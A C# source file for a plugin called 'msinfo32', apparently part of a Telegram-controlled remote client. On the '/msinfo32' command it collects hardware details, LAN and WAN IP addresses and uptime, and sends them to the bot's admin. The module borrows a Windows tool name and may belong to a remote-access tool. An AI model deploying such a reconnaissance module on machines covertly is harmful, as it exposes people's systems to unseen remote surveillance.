using msinfo32.Components;
using Sdk.Base;
using Sdk.Clients;
using Sdk.Containers;
using Sdk.Contracts;
using Sdk.Models;
using System.Text;

namespace msinfo32
{
    public class DllMain : PluginBase
    {
        private ITGBotClient _client;
        private IEnumerable<IComponent> _components;

        public DllMain()
        {
            base.Name = "/msinfo32";
            base.HasArguments = false;
            base.Description = "Print workstation information.";
        }

        public override void Dispatch()
        {
            var sb = new StringBuilder();

            foreach (IComponent _component in this._components)
            {
                sb.AppendLine(_component.GetInformation());
            }

            this._client.SendTextBackToAdmin(sb.ToString());
        }

        public override void Dispatch(DispatchData data)
        {
            throw new NotImplementedException();
        }

        public override void Init(IDependencyService service)
        {
            this._client = service.ResolveInstance<ITGBotClient>();
            var cpuidHelper = service.ResolveInstance<ICpuidHelper>();

            var _devices = cpuidHelper.GetProcessors()
                   .Concat(cpuidHelper.GetDisplayAdapters())
                   .Concat(cpuidHelper.GetMainboards())
                   .Concat(cpuidHelper.GetDrives());

            this._components = new IComponent[]
            {
                new SYSTEM_INFO(_devices),
                new LAN_IPv4(),
                new WAN_IPv4(),
                new UP_TIME()
            };
        }
    }
}
